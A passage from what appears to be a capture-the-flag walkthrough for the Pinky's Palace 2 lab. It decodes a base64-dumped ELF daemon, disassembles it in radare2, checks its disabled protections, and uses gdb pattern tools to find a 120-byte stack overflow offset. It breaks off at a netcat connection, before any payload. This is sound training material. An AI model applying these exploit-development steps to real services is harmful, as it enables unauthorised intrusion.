AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQCUAAAAAA
APAIQAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAADAAAAAAAAAAYB0AAAAAAAA0AAAAAAAAA
BAxAAAAAAAAZAAAAAAAAAAgeYAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAEB5gAAAAAAAc
AAAAAAAAAAgAAAAAAAAA9f7/bwAAAACYAkAAAAAAAAUAAAAAAAAAgARAAAAAAAAGAAAAAAAAALgC
QAAAAAAACgAAAAAAAACeAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAA
AAAAAAAAIGAAAAAAAAIAAAAAAAAAgAEAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAACYBUAA
AAAAAAcAAAAAAAAAaAVAAAAAAAAIAAAAAAAAADAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAP7//28A
AAAASAVAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAAAeBUAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgHmAAAAAAAAAAAAAAAAAA
AAAAAAAAAABGB0AAAAAAAFYHQAAAAAAAZgdAAAAAAAB2B0AAAAAAAIYHQAAAAAAAlgdAAAAAAACm
B0AAAAAAALYHQAAAAAAAxgdAAAAAAADWB0AAAAAAAOYHQAAAAAAA9gdAAAAAAAAGCEAAAAAAABYI
QAAAAAAAJghAAAAAAAA2CEAAAAAAAAAAAAAAAAAAAAAAAAAAAABHQ0M6IChEZWJpYW4gNi4zLjAt
MTgrZGViOXUxKSA2LjMuMCAyMDE3MDUxNgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AwABADgCQAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCQAAA
AAAAAAAAAAAAAAAAAAAAAwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCQAAAAAAAAAAAAAAA
AAAAAAAAAwAGAIAEQAAAAAAAAAAAAAAAAAAAAAAAAwAHAB4FQAAAAAAAAAAAAAAAAAAAAAAAAwAI
AEgFQAAAAAAAAAAAAAAAAAAAAAAAAwAJAGgFQAAAAAAAAAAAAAAAAAAAAAAAAwAKAJgFQAAAAAAA
AAAAAAAAAAAAAAAAAwALABgHQAAAAAAAAAAAAAAAAAAAAAAAAwAMADAHQAAAAAAAAAAAAAAAAAAA
AAAAAwANAEAIQAAAAAAAAAAAAAAAAAAAAAAAAwAOAAQMQAAAAAAAAAAAAAAAAAAAAAAAAwAPABAM
QAAAAAAAAAAAAAAAAAAAAAAAAwAQANQMQAAAAAAAAAAAAAAAAAAAAAAAAwARABgNQAAAAAAAAAAA
AAAAAAAAAAAAAwASAAgeYAAAAAAAAAAAAAAAAAAAAAAAAwATABAeYAAAAAAAAAAAAAAAAAAAAAAA
AwAUABgeYAAAAAAAAAAAAAAAAAAAAAAAAwAVACAeYAAAAAAAAAAAAAAAAAAAAAAAAwAWAPAfYAAA
AAAAAAAAAAAAAAAAAAAAAwAXAAAgYAAAAAAAAAAAAAAAAAAAAAAAAwAYAJggYAAAAAAAAAAAAAAA
AAAAAAAAAwAZAKggYAAAAAAAAAAAAAAAAAAAAAAAAwAaAAAAAAAAAAAAAAAAAAAAAAABAAAABADx
/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAUABgeYAAAAAAAAAAAAAAAAAAZAAAAAgANAHAIQAAAAAAA
AAAAAAAAAAAbAAAAAgANALAIQAAAAAAAAAAAAAAAAAAuAAAAAgANAPAIQAAAAAAAAAAAAAAAAABE
AAAAAQAZAKggYAAAAAAAAQAAAAAAAABTAAAAAQATABAeYAAAAAAAAAAAAAAAAAB6AAAAAgANABAJ
QAAAAAAAAAAAAAAAAACGAAAAAQASAAgeYAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAA
AAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACtAAAAAQARAEgOQAAAAAAAAAAAAAAAAAC7AAAA
AQAUABgeYAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADHAAAAAAASABAeYAAA
AAAAAAAAAAAAAADYAAAAAQAVACAeYAAAAAAAAAAAAAAAAADhAAAAAAASAAgeYAAAAAAAAAAAAAAA
AAD0AAAAAAAQANQMQAAAAAAAAAAAAAAAAAAHAQAAAQAXAAAgYAAAAAAAAAAAAAAAAAAdAQAAEgAN
AAAMQAAAAAAAAgAAAAAAAAAtAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAARAgAAIAAYAJggYAAAAAAA
AAAAAAAAAAA/AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABTAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABr
AQAAEAAYAKggYAAAAAAAAAAAAAAAAAAnAQAAEgAOAAQMQAAAAAAAAAAAAAAAAAByAQAAEgAAAAAA
AAAAAAAAAAAAAAAAAACGAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACZAQAAEgAAAAAAAAAAAAAAAAAA
AAAAAACrAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAC/AQAAEgANAGQJQAAAAAAARwAAAAAAAADJAQAA
EgAAAAAAAAAAAAAAAAAAAAAAAADdAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADwAQAAEgAAAAAAAAAA
AAAAAAAAAAAAAAAPAgAAEAAYAJggYAAAAAAAAAAAAAAAAAAcAgAAIAAAAAAAAAAAAAAAAAAAAAAA
AAArAgAAEQIYAKAgYAAAAAAAAAAAAAAAAAA4AgAAEQAPABAMQAAAAAAABAAAAAAAAABHAgAAEgAN
AJALQAAAAAAAZQAAAAAAAABXAgAAEgAAAAAAAAAAAAAAAAAAAAAAAADTAAAAEAAZALAgYAAAAAAA
AAAAAAAAAAAVAgAAEgANAEAIQAAAAAAAKwAAAAAAAABrAgAAEAAZAKggYAAAAAAAAAAAAAAAAAB3
AgAAEgANAKsJQAAAAAAA2QEAAAAAAAB8AgAAEgAAAAAAAAAAAAAAAAAAAAAAAACOAgAAEgAAAAAA
AAAAAAAAAAAAAAAAAACiAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAC0AgAAEQIYAKggYAAAAAAAAAAA
AAAAAADAAgAAEgANADYJQAAAAAAALgAAAAAAAADGAgAAEgAAAAAAAAAAAAAAAAAAAAAAAABRAgAA
EgALABgHQAAAAAAAAAAAAAAAAADYAgAAEgAAAAAAAAAAAAAAAAAAAAAAAADqAgAAEgAAAAAAAAAA
AAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMA
X19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC42OTcyAF9fZG9fZ2xvYmFsX2R0b3JzX2F1
eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9l
bnRyeQBwYW5lbC5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19pbml0X2FycmF5X2VuZABf
RFlOQU1JQwBfX2luaXRfYXJyYXlfc3RhcnQAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZG
U0VUX1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkAcmVjdkBAR0xJQkNfMi4yLjUAc3RyY3B5QEBHTElC
Q18yLjIuNQBzZXRzb2Nrb3B0QEBHTElCQ18yLjIuNQBfZWRhdGEAc3RybGVuQEBHTElCQ18yLjIu
NQBodG9uc0BAR0xJQkNfMi4yLjUAc2VuZEBAR0xJQkNfMi4yLjUAcHJpbnRmQEBHTElCQ18yLjIu
NQBoYW5kbGVjbWQAbWVtc2V0QEBHTElCQ18yLjIuNQBjbG9zZUBAR0xJQkNfMi4yLjUAX19saWJj
X3N0YXJ0X21haW5AQEdMSUJDXzIuMi41AF9fZGF0YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rz
b19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX19saWJjX2NzdV9pbml0AGxpc3RlbkBAR0xJQkNfMi4y
LjUAX19ic3Nfc3RhcnQAbWFpbgBiaW5kQEBHTElCQ18yLjIuNQBhY2NlcHRAQEdMSUJDXzIuMi41
AGV4aXRAQEdMSUJDXzIuMi41AF9fVE1DX0VORF9fAGZhdGFsAHdhaXRAQEdMSUJDXzIuMi41AGZv
cmtAQEdMSUJDXzIuMi41AHNvY2tldEBAR0xJQkNfMi4yLjUAAC5zeW10YWIALnN0cnRhYgAuc2hz
dHJ0YWIALmludGVycAAubm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gA
LmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJl
bGEucGx0AC5pbml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUA
LmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290AC5nb3QucGx0AC5kYXRh
AC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAAAAAADgCQAAAAAAAOAIAAAAAAAAc
AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAABUAkAAAAAAAFQC
AAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAxAAAABwAAAAIAAAAAAAAAdAJA
AAAAAAB0AgAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAPb//28CAAAA
AAAAAJgCQAAAAAAAmAIAAAAAAAAcAAAAAAAAAAUAAAAAAAAACAAAAAAAAAAAAAAAAAAAAE4AAAAL
AAAAAgAAAAAAAAC4AkAAAAAAALgCAAAAAAAAyAEAAAAAAAAGAAAAAQAAAAgAAAAAAAAAGAAAAAAA
AABWAAAAAwAAAAIAAAAAAAAAgARAAAAAAACABAAAAAAAAJ4AAAAAAAAAAAAAAAAAAAABAAAAAAAA
AAAAAAAAAAAAXgAAAP///28CAAAAAAAAAB4FQAAAAAAAHgUAAAAAAAAmAAAAAAAAAAUAAAAAAAAA
AgAAAAAAAAACAAAAAAAAAGsAAAD+//9vAgAAAAAAAABIBUAAAAAAAEgFAAAAAAAAIAAAAAAAAAAG
AAAAAQAAAAgAAAAAAAAAAAAAAAAAAAB6AAAABAAAAAIAAAAAAAAAaAVAAAAAAABoBQAAAAAAADAA
AAAAAAAABQAAAAAAAAAIAAAAAAAAABgAAAAAAAAAhAAAAAQAAABCAAAAAAAAAJgFQAAAAAAAmAUA
AAAAAACAAQAAAAAAAAUAAAAXAAAACAAAAAAAAAAYAAAAAAAAAI4AAAABAAAABgAAAAAAAAAYB0AA
AAAAABgHAAAAAAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACJAAAAAQAAAAYAAAAA
AAAAMAdAAAAAAAAwBwAAAAAAABABAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAlAAAAAEA
AAAGAAAAAAAAAEAIQAAAAAAAQAgAAAAAAADCAwAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAA
AJoAAAABAAAABgAAAAAAAAAEDEAAAAAAAAQMAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAA
AAAAAAAAAACgAAAAAQAAAAIAAAAAAAAAEAxAAAAAAAAQDAAAAAAAAMIAAAAAAAAAAAAAAAAAAAAI
AAAAAAAAAAAAAAAAAAAAqAAAAAEAAAACAAAAAAAAANQMQAAAAAAA1AwAAAAAAABEAAAAAAAAAAAA
AAAAAAAABAAAAAAAAAAAAAAAAAAAALYAAAABAAAAAgAAAAAAAAAYDUAAAAAAABgNAAAAAAAANAEA
AAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADAAAAADgAAAAMAAAAAAAAACB5gAAAAAAAIHgAA
AAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAzAAAAA8AAAADAAAAAAAAABAeYAAA
AAAAEB4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANgAAAABAAAAAwAAAAAA
AAAYHmAAAAAAABgeAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADdAAAABgAA
AAMAAAAAAAAAIB5gAAAAAAAgHgAAAAAAANABAAAAAAAABgAAAAAAAAAIAAAAAAAAABAAAAAAAAAA
5gAAAAEAAAADAAAAAAAAAPAfYAAAAAAA8B8AAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAI
AAAAAAAAAOsAAAABAAAAAwAAAAAAAAAAIGAAAAAAAAAgAAAAAAAAmAAAAAAAAAAAAAAAAAAAAAgA
AAAAAAAACAAAAAAAAAD0AAAAAQAAAAMAAAAAAAAAmCBgAAAAAACYIAAAAAAAABAAAAAAAAAAAAAA
AAAAAAAIAAAAAAAAAAAAAAAAAAAA+gAAAAgAAAADAAAAAAAAAKggYAAAAAAAqCAAAAAAAAAIAAAA
AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAP8AAAABAAAAMAAAAAAAAAAAAAAAAAAAAKggAAAA
AAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAA
AADYIAAAAAAAAIAHAAAAAAAAHAAAAC4AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAA
AAAAAAAAAAAAWCgAAAAAAAD+AgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAA
AAAAAAAAAAAAAAAAAAAAAFYrAAAAAAAACAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
$
```

```sh
root@kali:~/Pinkys-Palace2/binary# nano panel.b64
root@kali:~/Pinkys-Palace2/binary# base64 -d panel.b64 > panel
root@kali:~/Pinkys-Palace2/binary# file panel
panel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2d568c8bce502884642e6a62b93033441b616e46, not stripped
root@kali:~/Pinkys-Palace2/binary#
```

![](images/35.png)

```sh
u64@vm:~/Desktop$ chmod +x panel
u64@vm:~/Desktop$ r2 -d ./panel
Process with PID 2513 started...
= attach 2513 2513
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- This page intentionally left blank.
[0x7f22214f3c30]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 2513 2513
2513
[0x7f22214f3c30]> afl
0x00400000    2 40           sym.imp.__libc_start_main
0x00400718    3 23           sym._init
0x00400740    1 6            sym.imp.recv
0x00400750    1 6            sym.imp.strcpy
0x00400760    1 6            sym.imp.setsockopt
0x00400770    1 6            sym.imp.strlen
0x00400780    1 6            sym.imp.htons
0x00400790    1 6            sym.imp.send
0x004007a0    1 6            sym.imp.printf
0x004007b0    1 6            sym.imp.memset
0x004007c0    1 6            sym.imp.close
0x004007d0    1 6            sym.imp.listen
0x004007e0    1 6            sym.imp.bind
0x004007f0    1 6            sym.imp.accept
0x00400800    1 6            sym.imp.exit
0x00400810    1 6            sym.imp.wait
0x00400820    1 6            sym.imp.fork
0x00400830    1 6            sym.imp.socket
0x00400840    1 43           entry0
0x00400870    4 50   -> 41   sym.deregister_tm_clones
0x004008b0    3 53           sym.register_tm_clones
0x004008f0    3 28           sym.__do_global_dtors_aux
0x00400910    4 38   -> 35   entry1.init
0x00400936    1 46           sym.fatal
0x00400964    1 71           sym.handlecmd
0x004009ab   14 473          main
0x00400b90    4 101          sym.__libc_csu_init
0x00400c00    1 2            sym.__libc_csu_fini
0x00400c04    1 9            sym._fini
0x00601ff0    1 18           reloc.__libc_start_main
[0x7f22214f3c30]>
[0x7f22214f3c30]> pdf @main
/ (fcn) main 473
|   main ();
|           ; var int local_1050h @ rbp-0x1050
|           ; var int local_44h @ rbp-0x44
|           ; var int local_40h @ rbp-0x40
|           ; var int local_30h @ rbp-0x30
|           ; var int local_2eh @ rbp-0x2e
|           ; var int local_2ch @ rbp-0x2c
|           ; var int local_14h @ rbp-0x14
|           ; var int local_10h @ rbp-0x10
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|           ; var int local_4h @ rbp-0x4
|           ; DATA XREF from 0x0040085d (entry0)
|           0x004009ab      55             push rbp
|           0x004009ac      4889e5         mov rbp, rsp
|           0x004009af      4881ec501000.  sub rsp, 0x1050
|           ; JMP XREF from 0x00400b7f (main)
|       .-> 0x004009b6      e865feffff     call sym.imp.fork
|       :   0x004009bb      8945fc         mov dword [local_4h], eax
|       :   0x004009be      837dfc00       cmp dword [local_4h], 0
|      ,==< 0x004009c2      0f85ad010000   jne 0x400b75
|      |:   0x004009c8      c745f8010000.  mov dword [local_8h], 1
|      |:   0x004009cf      c745ec010000.  mov dword [local_14h], 1
|      |:   0x004009d6      ba00000000     mov edx, 0
|      |:   0x004009db      be01000000     mov esi, 1
|      |:   0x004009e0      bf02000000     mov edi, 2
|      |:   0x004009e5      e846feffff     call sym.imp.socket
|      |:   0x004009ea      8945f4         mov dword [local_ch], eax
|      |:   0x004009ed      837df4ff       cmp dword [local_ch], 0xffffffffffffffff
|     ,===< 0x004009f1      750c           jne 0x4009ff
|     ||:   0x004009f3      488d3d260200.  lea rdi, str.Fail_in_socket ; 0x400c20 ; "[-] Fail in socket"
|     ||:   0x004009fa      e837ffffff     call sym.fatal
|     `---> 0x004009ff      488d55ec       lea rdx, [local_14h]
|      |:   0x00400a03      8b45f4         mov eax, dword [local_ch]
|      |:   0x00400a06      41b804000000   mov r8d, 4
|      |:   0x00400a0c      4889d1         mov rcx, rdx
|      |:   0x00400a0f      ba02000000     mov edx, 2
|      |:   0x00400a14      be01000000     mov esi, 1
|      |:   0x00400a19      89c7           mov edi, eax
|      |:   0x00400a1b      e840fdffff     call sym.imp.setsockopt
|      |:   0x00400a20      83f8ff         cmp eax, 0xffffffffffffffff
|     ,===< 0x00400a23      750c           jne 0x400a31
|     ||:   0x00400a25      488d3d070200.  lea rdi, str.setting_sock_options ; 0x400c33 ; "setting sock options"
|     ||:   0x00400a2c      e805ffffff     call sym.fatal
|     `---> 0x00400a31      66c745d00200   mov word [local_30h], 2
|      |:   0x00400a37      bf697a0000     mov edi, 0x7a69
|      |:   0x00400a3c      e83ffdffff     call sym.imp.htons
|      |:   0x00400a41      668945d2       mov word [local_2eh], ax
|      |:   0x00400a45      c745d4000000.  mov dword [local_2ch], 0
|      |:   0x00400a4c      488d45d0       lea rax, [local_30h]
|      |:   0x00400a50      4883c008       add rax, 8
|      |:   0x00400a54      ba08000000     mov edx, 8
|      |:   0x00400a59      be00000000     mov esi, 0
|      |:   0x00400a5e      4889c7         mov rdi, rax
|      |:   0x00400a61      e84afdffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|      |:   0x00400a66      488d4dd0       lea rcx, [local_30h]
|      |:   0x00400a6a      8b45f4         mov eax, dword [local_ch]
|      |:   0x00400a6d      ba10000000     mov edx, 0x10               ; 16
|      |:   0x00400a72      4889ce         mov rsi, rcx
|      |:   0x00400a75      89c7           mov edi, eax
|      |:   0x00400a77      e864fdffff     call sym.imp.bind
|      |:   0x00400a7c      83f8ff         cmp eax, 0xffffffffffffffff
|     ,===< 0x00400a7f      750c           jne 0x400a8d
|     ||:   0x00400a81      488d3dc00100.  lea rdi, str.binding_to_socket ; 0x400c48 ; "binding to socket"
|     ||:   0x00400a88      e8a9feffff     call sym.fatal
|     `---> 0x00400a8d      8b45f4         mov eax, dword [local_ch]
|      |:   0x00400a90      be05000000     mov esi, 5
|      |:   0x00400a95      89c7           mov edi, eax
|      |:   0x00400a97      e834fdffff     call sym.imp.listen
|      |:   0x00400a9c      83f8ff         cmp eax, 0xffffffffffffffff
|     ,===< 0x00400a9f      750c           jne 0x400aad
|     ||:   0x00400aa1      488d3db20100.  lea rdi, str.listening      ; 0x400c5a ; "listening"
|     ||:   0x00400aa8      e889feffff     call sym.fatal
|     `---> 0x00400aad      c745bc100000.  mov dword [local_44h], 0x10 ; 16
|      |:   0x00400ab4      488d55bc       lea rdx, [local_44h]
|      |:   0x00400ab8      488d4dc0       lea rcx, [local_40h]
|      |:   0x00400abc      8b45f4         mov eax, dword [local_ch]
|      |:   0x00400abf      4889ce         mov rsi, rcx
|      |:   0x00400ac2      89c7           mov edi, eax
|      |:   0x00400ac4      e827fdffff     call sym.imp.accept
|      |:   0x00400ac9      8945f0         mov dword [local_10h], eax
|      |:   0x00400acc      837df0ff       cmp dword [local_10h], 0xffffffffffffffff
|     ,===< 0x00400ad0      750c           jne 0x400ade
|     ||:   0x00400ad2      488d3d8b0100.  lea rdi, str.new_sock_failed ; 0x400c64 ; "new sock failed"
|     ||:   0x00400ad9      e858feffff     call sym.fatal
|     `---> 0x00400ade      8b45f0         mov eax, dword [local_10h]
|      |:   0x00400ae1      b900000000     mov ecx, 0
|      |:   0x00400ae6      ba1f000000     mov edx, 0x1f               ; 31
|      |:   0x00400aeb      488d35860100.  lea rsi, str.Welcome_to_The_Daemon ; 0x400c78 ; "[+] Welcome to The Daemon [+]\n"
|      |:   0x00400af2      89c7           mov edi, eax
|      |:   0x00400af4      e897fcffff     call sym.imp.send
|      |:   0x00400af9      8b45f0         mov eax, dword [local_10h]
|      |:   0x00400afc      b900000000     mov ecx, 0
|      |:   0x00400b01      ba21000000     mov edx, 0x21               ; '!' ; 33
|      |:   0x00400b06      488d358b0100.  lea rsi, str.This_is_soon_to_be_our_backdoor ; 0x400c98 ; "This is soon to be our backdoor\n"
|      |:   0x00400b0d      89c7           mov edi, eax
|      |:   0x00400b0f      e87cfcffff     call sym.imp.send
|      |:   0x00400b14      8b45f0         mov eax, dword [local_10h]
|      |:   0x00400b17      b900000000     mov ecx, 0
|      |:   0x00400b1c      ba19000000     mov edx, 0x19               ; 25
|      |:   0x00400b21      488d35910100.  lea rsi, str.into_Pinky_s_Palace. ; 0x400cb9 ; "into Pinky's Palace.\n=> "
|      |:   0x00400b28      89c7           mov edi, eax
|      |:   0x00400b2a      e861fcffff     call sym.imp.send
|      |:   0x00400b2f      488db5b0efff.  lea rsi, [local_1050h]
|      |:   0x00400b36      8b45f0         mov eax, dword [local_10h]
|      |:   0x00400b39      b900000000     mov ecx, 0
|      |:   0x00400b3e      ba00100000     mov edx, 0x1000
|      |:   0x00400b43      89c7           mov edi, eax
|      |:   0x00400b45      e8f6fbffff     call sym.imp.recv
|      |:   0x00400b4a      8945f8         mov dword [local_8h], eax
|      |:   0x00400b4d      8b55f0         mov edx, dword [local_10h]
|      |:   0x00400b50      488d85b0efff.  lea rax, [local_1050h]
|      |:   0x00400b57      89d6           mov esi, edx
|      |:   0x00400b59      4889c7         mov rdi, rax
|      |:   0x00400b5c      e803feffff     call sym.handlecmd
|      |:   0x00400b61      8b45f0         mov eax, dword [local_10h]
|      |:   0x00400b64      89c7           mov edi, eax
|      |:   0x00400b66      e855fcffff     call sym.imp.close          ; int close(int fildes)
|      |:   0x00400b6b      bf00000000     mov edi, 0
|      |:   0x00400b70      e88bfcffff     call sym.imp.exit           ; void exit(int status)
|      `--> 0x00400b75      bf00000000     mov edi, 0
|       :   0x00400b7a      e891fcffff     call sym.imp.wait
\       `=< 0x00400b7f      e932feffff     jmp 0x4009b6
[0x004009ab]>
```

![](images/36.png)

```sh
u64@vm:~/Desktop$ gdb ./panel -q
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

```sh
u64@vm:~/Desktop$ pkill -9 panel
```

```sh
u64@vm:~/Desktop$ gdb ./panel -q
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ pattern_create 150
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
gdb-peda$ q
u64@vm:~/Desktop$
```

```sh
u64@vm:~/Desktop$ gdb ./panel -q
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/u64/Desktop/panel
[New process 15826]

Thread 2.1 "panel" received signal SIGSEGV, Segmentation fault.
[Switching to process 15826]
[----------------------------------registers-----------------------------------]
RAX: 0x97
RBX: 0x0
RCX: 0x7ffff7b153dd (<__libc_send+29>:	cmp    rax,0xfffffffffffff000)
RDX: 0x97
RSI: 0x7fffffffd410 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
RDI: 0x4
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffd488 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
RIP: 0x4009aa (<handlecmd+70>:	ret)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x246
R12: 0x400840 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe5c0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:	call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:	nop
   0x4009a9 <handlecmd+69>:	leave
=> 0x4009aa <handlecmd+70>:	ret
   0x4009ab <main>:	push   rbp
   0x4009ac <main+1>:	mov    rbp,rsp
   0x4009af <main+4>:	sub    rsp,0x1050
   0x4009b6 <main+11>:	call   0x400820 <fork@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd488 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
0008| 0x7fffffffd490 ("AkAAPAAlAAQAAmAARAAoAA\n")
0016| 0x7fffffffd498 ("AAQAAmAARAAoAA\n")
0024| 0x7fffffffd4a0 --> 0xa41416f414152 ('RAAoAA\n')
0032| 0x7fffffffd4a8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
0040| 0x7fffffffd4b0 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
0048| 0x7fffffffd4b8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
0056| 0x7fffffffd4c0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa in handlecmd ()
gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n
jAA9AAOAAkAAPAAlAAQAAmAARAAoAA found at offset: 120
gdb-peda$
```

```sh
u64@vm:~/Desktop$ nc localhost 31337
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
